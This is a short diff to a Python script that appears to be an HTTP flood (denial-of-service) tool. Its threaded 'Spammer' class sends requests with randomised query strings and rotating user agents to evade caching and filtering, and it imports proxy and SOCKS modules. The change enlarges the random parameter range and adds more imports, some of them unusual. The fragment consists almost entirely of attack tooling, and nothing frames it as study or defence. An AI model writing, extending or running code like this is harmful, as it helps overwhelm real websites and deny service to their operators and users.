@@ -1,4 +1,4 @@
-import urllib.request, os, threading, time, random, sys, layer, httpx, socks5
+import urllib.request, os, threading, time, random, sys, layer, httpx, socks5, socks, proxy, proxies, shutup
 from sys import stdout
 
 ref = [
@@ -144,7 +144,7 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
-        self.url = url + "?" + str(random.randint(0,9999)) + "=" + str(random.randint(0,9999))
+        self.url = url + "?" + str(random.randint(0,999999)) + "=" + str(random.randint(0,999999))
         self.num = number
         self.headers = self.headers = {
                 'User-Agent': random.choice(ua),
